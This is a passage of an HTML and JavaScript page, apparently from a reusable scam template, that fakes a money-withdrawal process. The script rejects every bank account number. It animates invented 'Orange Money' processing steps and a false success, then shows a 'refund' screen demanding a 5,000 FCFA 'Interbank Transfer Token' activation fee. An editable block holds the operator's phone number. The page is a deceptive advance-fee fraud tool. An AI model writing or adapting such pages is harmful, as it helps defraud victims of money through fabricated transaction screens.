ur Money Has Been Refunded<\/p>\r\n          <p style=\"font-size: 12px; color: #1e5631; margin: 0; line-height: 1.7;\"><strong id=\"mtn-refund-amount\">\u2014<\/strong> has been returned to your account balance. No funds were lost.<\/p>\r\n        <\/div>\r\n      <\/div>\r\n\r\n      <!-- Transaction summary -->\r\n      <div style=\"background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 10px; padding: 1rem; margin-bottom: 1rem;\">\r\n        <div style=\"display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #eeeeee;\">\r\n          <span style=\"font-size: 12px; color: #888888;\">Processor<\/span>\r\n          <span style=\"font-size: 12px; font-weight: 700; color: #1a1a1a;\">Orange Money<\/span>\r\n        <\/div>\r\n        <div style=\"display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #eeeeee;\">\r\n          <span style=\"font-size: 12px; color: #888888;\">To<\/span>\r\n          <span style=\"font-size: 12px; font-weight: 700; color: #1a1a1a;\" id=\"mtn-refund-to\">\u2014<\/span>\r\n        <\/div>\r\n        <div style=\"display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #eeeeee;\">\r\n          <span style=\"font-size: 12px; color: #888888;\">Amount<\/span>\r\n          <span style=\"font-size: 13px; font-weight: 700; color: #1a1a1a;\" id=\"mtn-refund-amt-row\">\u2014<\/span>\r\n        <\/div>\r\n        <div style=\"display: flex; justify-content: space-between; padding: 6px 0;\">\r\n          <span style=\"font-size: 12px; color: #888888;\">Status<\/span>\r\n          <span style=\"font-size: 12px; font-weight: 700; color: #e67e22;\">Refunded<\/span>\r\n        <\/div>\r\n      <\/div>\r\n\r\n      <!-- Solution -->\r\n      <div style=\"background-color: #fff8e1; border: 1px solid #ffe082; border-radius: 10px; padding: 0.9rem 1rem; margin-bottom: 1rem;\">\r\n        <p style=\"font-size: 11px; font-weight: 700; color: #7a5800; margin: 0 0 6px; text-transform: uppercase; letter-spacing: 0.05em;\">&#128161; Solution<\/p>\r\n        <p style=\"font-size: 12px; color: #7a5800; margin: 0; line-height: 1.75;\">Activate your <strong>Interbank Transfer Token<\/strong> to complete this withdrawal. This is a one-time verification that links your account to the Orange Money interbank routing network, allowing international withdrawals to pass through without being blocked.<\/p>\r\n      <\/div>\r\n\r\n      <!-- Fee row -->\r\n      <div style=\"border: 1px solid #e0e0e0; border-radius: 10px; padding: 0.85rem 1rem; margin-bottom: 1.25rem; display: flex; align-items: center; justify-content: space-between; background-color: #fafafa;\">\r\n        <div>\r\n          <p style=\"font-size: 11px; color: #888888; margin: 0 0 3px; text-transform: uppercase; letter-spacing: 0.04em; font-weight: 700;\">Activation Fee<\/p>\r\n          <p style=\"font-size: 24px; font-weight: 700; color: #1a1a1a; margin: 0; line-height: 1;\">5,000 <span style=\"font-size: 13px; color: #888888; font-weight: 400;\">FCFA<\/span><\/p>\r\n        <\/div>\r\n        <span style=\"font-size: 26px;\">&#129534;<\/span>\r\n      <\/div>\r\n\r\n      <button onclick=\"closeMTNOverlay()\" style=\"width: 100%; padding: 0.8rem; background-color: #ffcc00; color: #1a1200; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; margin-bottom: 10px;\">\r\n        PAY NOW\r\n      <\/button>\r\n      <button onclick=\"closeMTNOverlay()\" style=\"width: 100%; padding: 0.6rem; background: transparent; color: #888888; border: 1px solid #dddddd; border-radius: 8px; font-size: 13px; font-weight: 700; cursor: pointer;\">\r\n        Cancel\r\n      <\/button>\r\n\r\n    <\/div>\r\n\r\n  <\/div>\r\n<\/div>\r\n\r\n\r\n<style>\r\n  @keyframes blink {\r\n    0%, 100% { opacity: 1; }\r\n    50% { opacity: 0.2; }\r\n  }\r\n  @keyframes mtn-spin {\r\n    to { transform: rotate(360deg); }\r\n  }\r\n<\/style>\r\n\r\n<script>\r\n  \/* ============================================\r\n     EDIT THESE VALUES ONLY\r\n     ============================================ *\/\r\n  var WITHDRAWAL_MIN = 1000;\r\n  var WITHDRAWAL_MAX = 786400;\r\n  var MTN_MIN = 1000;\r\n  var MTN_MAX = 500000;\r\n  var MTN_FIXED_NUMBER = '+237 692066776'; \/* \u270F\uFE0F Replace with real number *\/\r\n  \/* ============================================ *\/\r\n\r\n  (function () {\r\n    var el = document.getElementById('mtn-fixed-number');\r\n    if (el) el.textContent = MTN_FIXED_NUMBER;\r\n  })();\r\n\r\n  function fmt(n) {\r\n    return Number(n).toLocaleString() + ' FCFA';\r\n  }\r\n\r\n  function showStage(id) {\r\n    ['mtn-stage-sending', 'mtn-stage-success', 'mtn-stage-refund'].forEach(function (s) {\r\n      document.getElementById(s).style.display = s === id ? 'block' : 'none';\r\n    });\r\n  }\r\n\r\n  function toggleBank() {\r\n    var panel = document.getElementById('bank-panel');\r\n    if (panel.style.display === 'none') {\r\n      panel.style.display = 'block';\r\n    } else {\r\n      panel.style.display = 'none';\r\n      document.getElementById('bank-input').value = '';\r\n      document.getElementById('bank-amount-input').value = '';\r\n      document.getElementById('bank-error').style.display = 'none';\r\n      document.getElementById('bank-amount-error').style.display = 'none';\r\n    }\r\n  }\r\n\r\n  function toggleMTN() {\r\n    var panel = document.getElementById('mtn-panel');\r\n    if (panel.style.display === 'none') {\r\n      panel.style.display = 'block';\r\n    } else {\r\n      panel.style.display = 'none';\r\n      document.getElementById('mtn-amount-input').value = '';\r\n      document.getElementById('mtn-amount-error').style.display = 'none';\r\n    }\r\n  }\r\n\r\n  function validateBank() {\r\n    var accountVal  = document.getElementById('bank-input').value.trim();\r\n    var amountVal   = parseFloat(document.getElementById('bank-amount-input').value);\r\n    var bankError   = document.getElementById('bank-error');\r\n    var amountError = document.getElementById('bank-amount-error');\r\n    bankError.style.display = 'none';\r\n    amountError.style.display = 'none';\r\n    if (isNaN(amountVal) || document.getElementById('bank-amount-input').value === '') {\r\n      amountError.innerHTML = '&#10007; Please enter a withdrawal amount.';\r\n      amountError.style.display = 'block'; return;\r\n    }\r\n    if (amountVal < WITHDRAWAL_MIN) {\r\n      amountError.innerHTML = '&#10007; Minimum withdrawal is ' + WITHDRAWAL_MIN.toLocaleString() + ' FCFA.';\r\n      amountError.style.display = 'block'; return;\r\n    }\r\n    if (amountVal > WITHDRAWAL_MAX) {\r\n      amountError.innerHTML = '&#10007; Maximum withdrawal is ' + WITHDRAWAL_MAX.toLocaleString() + ' FCFA.';\r\n      amountError.style.display = 'block'; return;\r\n    }\r\n    if (accountVal.length === 0) {\r\n      bankError.innerHTML = '&#10007; Please enter your Bank of America account number.';\r\n      bankError.style.display = 'block'; return;\r\n    }\r\n    bankError.innerHTML = '&#10007; Invalid account number. Please use a valid Bank of America account.';\r\n    bankError.style.display = 'block';\r\n  }\r\n\r\n  function validateMTN() {\r\n    var amountVal   = parseFloat(document.getElementById('mtn-amount-input').value);\r\n    var amountError = document.getElementById('mtn-amount-error');\r\n    amountError.style.display = 'none';\r\n    if (isNaN(amountVal) || document.getElementById('mtn-amount-input').value === '') {\r\n      amountError.innerHTML = '&#10007; Please enter a withdrawal amount.';\r\n      amountError.style.display = 'block'; return;\r\n    }\r\n    if (amountVal < MTN_MIN) {\r\n      amountError.innerHTML = '&#10007; Minimum withdrawal is ' + MTN_MIN.toLocaleString() + ' FCFA.';\r\n      amountError.style.display = 'block'; return;\r\n    }\r\n    if (amountVal > MTN_MAX) {\r\n      amountError.innerHTML = '&#10007; Maximum withdrawal is ' + MTN_MAX.toLocaleString() + ' FCFA.';\r\n      amountError.style.display = 'block'; return;\r\n    }\r\n\r\n    var fmtAmt = fmt(amountVal);\r\n\r\n    \/\/ Populate all stages\r\n    document.getElementById('mtn-proc-to').textContent        = MTN_FIXED_NUMBER;\r\n    document.getElementById('mtn-proc-amount').textContent    = fmtAmt;\r\n    document.getElementById('mtn-success-to').textContent     = MTN_FIXED_NUMBER;\r\n    document.getElementById('mtn-success-amount').textContent = fmtAmt;\r\n    document.getElementById('mtn-refund-to').textContent      = MTN_FIXED_NUMBER;\r\n    document.getElementById('mtn-refund-amt-row').textContent = fmtAmt;\r\n    document.getElementById('mtn-refund-amount').textContent  = fmtAmt;\r\n\r\n    \/\/ Reset to stage 1\r\n    document.getElementById('mtn-proc-label').textContent  = 'Sending payment...';\r\n    document.getElementById('mtn-proc-status').textContent = 'Processing...';\r\n    document.getElementById('mtn-proc-status').style.color = '#2d6a4f';\r\n    showStage('mtn-stage-sending');\r\n    document.getElementById('mtn-overlay').style.display = 'flex';\r\n\r\n    \/\/ Stage 1 \u2014 live status messages\r\n    setTimeout(function () {\r\n      document.getElementById('mtn-proc-label').textContent  = 'Contacting Orange Money servers...';\r\n    }, 900);\r\n    setTimeout(function () {\r\n      document.getElementById('mtn-proc-label').textContent  = 'Authorising transfer...';\r\n      document.getElementById('mtn-proc-status').textContent = 'Authorising...';\r\n    }, 2000);\r\n    setTimeout(function () {\r\n      document.getElementById('mtn-proc-label').textContent  = 'Completing transfer...';\r\n      document.getElementById('mtn-proc-status').textContent = 'Sending...';\r\n    }, 3100);\r\n\r\n    \/\/ Stage 2 \u2014 success\r\n    setTimeout(function () {\r\n      showStage('mtn-stage-success');\r\n    }, 4400);\r\n\r\n    \/\/ Stage 3 \u2014 error + refund + fee\r\n    setTimeout(function () {\r\n      showStage('mtn-stage-refund');\r\n    }, 8200);\r\n  }\r\n\r\n  function closeMTNOverlay() {\r\n    document.getElementById('mtn-overlay').style.display = 'none';\r\n  }\r\n<\/script>",
